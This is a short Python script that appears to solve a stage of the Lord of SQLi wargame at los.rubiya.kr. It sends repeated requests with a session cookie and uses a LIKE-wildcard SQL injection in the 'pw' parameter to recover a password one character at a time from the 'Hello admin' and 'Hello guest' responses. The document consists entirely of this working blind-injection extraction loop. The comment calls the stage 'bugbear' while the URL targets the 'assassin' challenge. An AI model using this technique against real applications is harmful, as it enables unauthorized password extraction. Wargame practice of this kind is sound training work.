# LOS
# STEP 13 bugbear


import requests

url ="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?" #공격URL
cookies ={"PHPSESSID": "5mc7krftsj3sgtp7h7ofqnnr0a"} #쿠키값
payload=""
check=0


while 1:

    for num in range(48,122):
        tmp = payload + chr(num)+'%'  #9% -> 90% -> 902%
        params = {'pw': tmp}

        response = requests.get(url, params=params, cookies=cookies)

        if ("Hello admin" in  response.text):
            payload = payload +chr(num) #9 -> 90 -> 902 (한글자씩 쌓기)
            print(">> " ,payload)
            check = 1

        if ("Hello guest" in  response.text):
            payload = payload +chr(num)
            print("pw: " ,payload)
            break

    if check == 1:
        break
        